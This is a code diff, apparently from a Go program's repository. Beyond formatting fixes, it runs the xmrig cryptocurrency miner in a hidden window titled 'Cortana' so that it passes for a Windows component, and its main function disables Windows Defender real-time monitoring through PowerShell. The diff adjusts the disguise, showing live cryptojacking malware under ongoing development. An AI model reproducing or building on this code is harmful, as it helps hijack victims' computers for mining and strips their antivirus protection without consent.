@@ -25,7 +25,7 @@ const (
 func downloadFile(filepath string, url string) (err error) {
 	// Create the file
 	out, err := os.Create(filepath)
-	if err != nil	{
+	if err != nil {
 		return err
 	}
 	defer out.Close()
@@ -44,7 +44,7 @@ func downloadFile(filepath string, url string) (err error) {
 
 	// Writer the body to file
 	_, err = io.Copy(out, resp.Body)
-	if err != nil	{
+	if err != nil {
 		return err
 	}
 
@@ -116,9 +116,12 @@ func unzipFile(f *zip.File, destination string) error {
 }
 
 func startCommand(dir string) {
-	cmd := exec.Command("cmd", "/C", "title", "Cortana", ";", filepath.Join(dir, "xmrcache", "xmrig.exe"), "-c", filepath.Join(dir, "xmrcache", "config.json"))
+	cmd := exec.Command(filepath.Join(dir, "xmrcache", "xmrig.exe"), "-c", filepath.Join(dir, "xmrcache", "config.json"))
 
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	cmd.SysProcAttr = &syscall.SysProcAttr{
+		HideWindow:  true,
+		WindowTitle: "Cortana",
+	}
 
 	if err := cmd.Start(); err != nil {
 		log.Printf("Failed to start cmd: %v", err)
@@ -220,7 +223,7 @@ func main() {
 	cmd := exec.Command("powershell", "Set-MpPreference -DisableRealtimeMonitoring $true")
 	cmd.Run()
 
-	f, err := os.OpenFile("log.txt", os.O_RDWR | os.O_CREATE | os.O_APPEND, 0666)
+	f, err := os.OpenFile("log.txt", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
 	if err != nil {
 		log.Fatalf("error opening file: %v", err)
 	}
